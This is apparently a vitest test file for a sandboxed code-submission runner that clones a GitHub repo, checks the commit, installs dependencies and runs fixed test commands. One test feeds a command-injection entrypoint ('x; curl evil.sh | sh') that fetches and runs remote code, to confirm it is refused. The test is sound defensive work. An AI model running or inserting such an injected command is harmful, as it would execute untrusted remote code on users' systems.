import { describe, expect, it } from "vitest";
import { CommandExitError, TimeoutError } from "e2b";
import { executeSubmission, isCommandTimeout, runCommandTolerant } from "./execute";
import type { CommandOutcome, SandboxLike } from "./execute";
import type { BountiedManifest } from "./bountied-manifest";

const SHA = "a".repeat(40);
const OTHER_SHA = "b".repeat(40);
const TOKEN = "ghp_secretTokenValue123";
const REPO = "https://github.com/solver/project";

type Reply = Partial<CommandOutcome> | Error;
type Handler = [RegExp, Reply | (() => Reply)];

/** A scripted sandbox: the first handler whose pattern matches the command answers. */
function fakeSandbox(handlers: Handler[]) {
  const commands: string[] = [];
  let killed = 0;
  const sandbox: SandboxLike = {
    commands: {
      async run(command) {
        commands.push(command);
        const hit = handlers.find(([re]) => re.test(command));
        const reply = hit ? (typeof hit[1] === "function" ? hit[1]() : hit[1]) : {};
        if (reply instanceof Error) throw reply;
        return { stdout: "", stderr: "", exitCode: 0, ...reply };
      },
    },
    async kill() {
      killed += 1;
    },
  };
  return { sandbox, commands, killed: () => killed };
}

const exitError = (exitCode: number, stdout = "", stderr = "") =>
  new CommandExitError({ exitCode, stdout, stderr, error: "exit" });
const commandTimeout = () =>
  new TimeoutError("x: This error is likely due to exceeding 'timeoutMs' — the total time a long running request can be active.");

const HEAD: Handler = [/rev-parse HEAD/, { stdout: SHA + "\n" }];

function run(
  handlers: Handler[],
  extra: { manifest?: BountiedManifest; expectedCommitSha?: string; runtime?: "PYTHON" | "NODE" } = {}
) {
  const fake = fakeSandbox(handlers);
  const promise = executeSubmission(
    {
      runtime: extra.runtime ?? "PYTHON",
      repoUrl: REPO,
      githubToken: TOKEN,
      expectedCommitSha: extra.expectedCommitSha,
      manifest: extra.manifest,
    },
    { createSandbox: async () => fake.sandbox }
  );
  return { fake, promise };
}

const testsManifest: BountiedManifest = { dependencies: [], executionMode: "test" };

describe("runCommandTolerant", () => {
  it("returns a non-zero exit as a normal result instead of throwing", async () => {
    const { sandbox } = fakeSandbox([[/x/, exitError(3, "out", "err")]]);
    expect(await runCommandTolerant(sandbox, "x")).toEqual({ stdout: "out", stderr: "err", exitCode: 3, timedOut: false });
  });

  it("reports a command's own timeout as timedOut", async () => {
    const { sandbox } = fakeSandbox([[/x/, commandTimeout()]]);
    expect((await runCommandTolerant(sandbox, "x")).timedOut).toBe(true);
  });

  it("rethrows anything else (a real infrastructure failure)", async () => {
    const { sandbox } = fakeSandbox([[/x/, new Error("connection dropped")]]);
    await expect(runCommandTolerant(sandbox, "x")).rejects.toThrow("connection dropped");
  });

  it("does not treat a request-level timeout as a program timeout", () => {
    expect(isCommandTimeout(new TimeoutError("x: exceeding 'requestTimeoutMs'. You can pass it."))).toBe(false);
    expect(isCommandTimeout(commandTimeout())).toBe(true);
  });
});

describe("executeSubmission: the happy path and the commit pin", () => {
  it("runs the planner's manifest at the verified commit and reports that commit", async () => {
    const { fake, promise } = run([HEAD, [/pytest/, { stdout: "3 passed" }]], {
      manifest: testsManifest,
      expectedCommitSha: SHA,
    });
    const r = await promise;
    expect(r.ok).toBe(true);
    expect(r.exitCode).toBe(0);
    expect(r.commitSha).toBe(SHA);
    expect(r.stdout).toContain("3 passed");
    expect(fake.killed()).toBe(1);
  });

  it("reads the commit BEFORE removing .git", async () => {
    const { fake, promise } = run([HEAD], { manifest: testsManifest, expectedCommitSha: SHA });
    await promise;
    const revParse = fake.commands.findIndex((c) => c.includes("rev-parse HEAD"));
    const strip = fake.commands.findIndex((c) => c.includes("rm -rf") && c.includes(".git"));
    expect(revParse).toBeGreaterThanOrEqual(0);
    expect(strip).toBeGreaterThan(revParse);
  });

  it("stops with a setup failure when the clone is a different commit, and never runs the program", async () => {
    const { fake, promise } = run([[/rev-parse HEAD/, { stdout: OTHER_SHA }]], {
      manifest: testsManifest,
      expectedCommitSha: SHA,
    });
    const r = await promise;
    expect(r.ok).toBe(false);
    expect(r.kind).toBe("setup");
    expect(r.commitSha).toBe(OTHER_SHA);
    expect(fake.commands.some((c) => c.includes("pytest"))).toBe(false);
    expect(fake.killed()).toBe(1);
  });

  it("stops with a setup failure when HEAD cannot be read as a 40-hex SHA", async () => {
    for (const reply of [{ stdout: "not-a-sha" }, { stdout: SHA, exitCode: 1 }, { stdout: SHA.slice(0, 39) }] as Reply[]) {
      const { promise } = run([[/rev-parse HEAD/, reply]], { manifest: testsManifest });
      const r = await promise;
      expect(r.kind).toBe("setup");
    }
  });

  it("rejects an invalid expected SHA before booting anything", async () => {
    const { fake, promise } = run([HEAD], { manifest: testsManifest, expectedCommitSha: "main" });
    const r = await promise;
    expect(r.kind).toBe("setup");
    expect(fake.commands).toHaveLength(0);
  });
});

describe("executeSubmission: non-zero exits and timeouts", () => {
  it("returns a failing test run as a real result with its exit code (E2B throws on it)", async () => {
    const { promise } = run([HEAD, [/pytest/, exitError(1, "1 failed, 2 passed", "")]], { manifest: testsManifest });
    const r = await promise;
    expect(r.ok).toBe(true);
    expect(r.exitCode).toBe(1);
    expect(r.stdout).toContain("1 failed");
  });

  it("reports the program running too long as kind timeout", async () => {
    const { promise } = run([HEAD, [/pytest/, commandTimeout()]], { manifest: testsManifest });
    const r = await promise;
    expect(r.ok).toBe(false);
    expect(r.kind).toBe("timeout");
    expect(r.commitSha).toBe(SHA);
  });

  it("reports a dropped connection during the run as infra", async () => {
    const { promise } = run([HEAD, [/pytest/, new Error("socket hang up")]], { manifest: testsManifest });
    const r = await promise;
    expect(r.kind).toBe("infra");
  });
});

describe("executeSubmission: clone failures", () => {
  it("reports a failed clone as kind clone and scrubs the token from the reason", async () => {
    const b64 = Buffer.from(`x-access-token:${TOKEN}`).toString("base64");
    const { fake, promise } = run([[/git .*clone/, exitError(128, "", `fatal: auth failed ${TOKEN} ${b64}`)]], {
      manifest: testsManifest,
    });
    const r = await promise;
    expect(r.kind).toBe("clone");
    expect(r.reason).not.toContain(TOKEN);
    expect(r.reason).not.toContain(b64);
    expect(fake.killed()).toBe(1);
  });

  it("reports a clone that times out as kind clone", async () => {
    const { promise } = run([[/git .*clone/, commandTimeout()]], { manifest: testsManifest });
    expect((await promise).kind).toBe("clone");
  });

  it("rejects a non-GitHub URL before booting a sandbox", async () => {
    let booted = 0;
    const r = await executeSubmission(
      { runtime: "PYTHON", repoUrl: "https://evil.example/a/b", githubToken: TOKEN, manifest: testsManifest },
      {
        createSandbox: async () => {
          booted += 1;
          return fakeSandbox([]).sandbox;
        },
      }
    );
    expect(r.kind).toBe("clone");
    expect(booted).toBe(0);
  });
});

describe("executeSubmission: dependency install", () => {
  const withDeps: BountiedManifest = {
    dependencies: [{ name: "requests", version: "2.31.0" }],
    executionMode: "test",
  };

  it("does not install when the effective manifest declares nothing", async () => {
    const { fake, promise } = run([HEAD], { manifest: testsManifest });
    await promise;
    expect(fake.commands.some((c) => c.startsWith("pip install"))).toBe(false);
  });

  it("installs the declared dependencies with the fixed template, then runs", async () => {
    const { fake, promise } = run([HEAD], { manifest: withDeps });
    const r = await promise;
    expect(r.ok).toBe(true);
    expect(fake.commands.some((c) => c === "pip install 'requests==2.31.0'")).toBe(true);
  });

  it("fails a bad install with its real output (the old exitCode branch could never run)", async () => {
    const stderr = "ERROR: No matching distribution found for requests==9.9.9";
    const { fake, promise } = run([HEAD, [/^pip install/, exitError(1, "", stderr)]], { manifest: withDeps });
    const r = await promise;
    expect(r.ok).toBe(false);
    expect(r.kind).toBe("dependency-install");
    expect(r.output).toContain("No matching distribution");
    expect(fake.commands.some((c) => c.includes("pytest"))).toBe(false);
  });

  it("fixes a missing system library with apt-get in the same sandbox, retries once, and carries on", async () => {
    let installs = 0;
    const { fake, promise } = run(
      [
        HEAD,
        [/^pip install/, () => (++installs === 1 ? exitError(1, "", "pg_config executable not found") : {})],
      ],
      { manifest: withDeps }
    );
    const r = await promise;
    expect(r.ok).toBe(true);
    expect(installs).toBe(2);
    expect(fake.commands.some((c) => c.startsWith("apt-get install") && c.includes("libpq-dev"))).toBe(true);
  });

  it("gives up when the retry still fails", async () => {
    const { promise } = run([HEAD, [/^pip install/, exitError(1, "", "pg_config executable not found")]], {
      manifest: withDeps,
    });
    const r = await promise;
    expect(r.kind).toBe("dependency-install");
  });

  it("treats a slow install as a platform problem, not the Solver's", async () => {
    const { promise } = run([HEAD, [/^pip install/, commandTimeout()]], { manifest: withDeps });
    const r = await promise;
    expect(r.kind).toBe("infra");
  });
});

describe("executeSubmission: only fixed command templates run", () => {
  it("runs pytest for tests mode", async () => {
    const { fake, promise } = run([HEAD], { manifest: testsManifest });
    await promise;
    expect(fake.commands).toContain("python -m pytest -q --tb=no -p no:cacheprovider");
  });

  it("runs the planner's entry file for entry mode", async () => {
    const { fake, promise } = run([HEAD], {
      manifest: { dependencies: [], executionMode: "run", entrypoint: "app.py" },
    });
    await promise;
    expect(fake.commands).toContain("python app.py");
  });

  it("runs npm test for Node tests mode", async () => {
    const { fake, promise } = run([HEAD], { manifest: testsManifest, runtime: "NODE" });
    await promise;
    expect(fake.commands).toContain("npm test");
  });

  it("refuses an unsafe entrypoint as a setup failure instead of running it", async () => {
    const { fake, promise } = run([HEAD], {
      manifest: { dependencies: [], executionMode: "run", entrypoint: "x; curl evil.sh | sh" },
    });
    const r = await promise;
    expect(r.kind).toBe("setup");
    expect(fake.commands.some((c) => c.includes("curl"))).toBe(false);
  });
});

describe("executeSubmission: Giver review path (no manifest given)", () => {
  it("reads bountied.json from the clone and installs from it", async () => {
    const json = JSON.stringify({ dependencies: [{ name: "requests", version: "2.31.0" }] });
    const { fake, promise } = run([HEAD, [/cat .*bountied\.json/, { stdout: json }]]);
    const r = await promise;
    expect(r.ok).toBe(true);
    expect(fake.commands.some((c) => c.startsWith("pip install"))).toBe(true);
  });

  it("skips install and uses the default when there is no bountied.json", async () => {
    const { fake, promise } = run([HEAD, [/cat .*bountied\.json/, { stdout: "__MISSING__\n" }]]);
    const r = await promise;
    expect(r.ok).toBe(true);
    expect(fake.commands.some((c) => c.startsWith("pip install"))).toBe(false);
  });

  it("fails a malformed bountied.json as dependency-install, as before", async () => {
    const { promise } = run([HEAD, [/cat .*bountied\.json/, { stdout: "{ not json" }]]);
    expect((await promise).kind).toBe("dependency-install");
  });
});
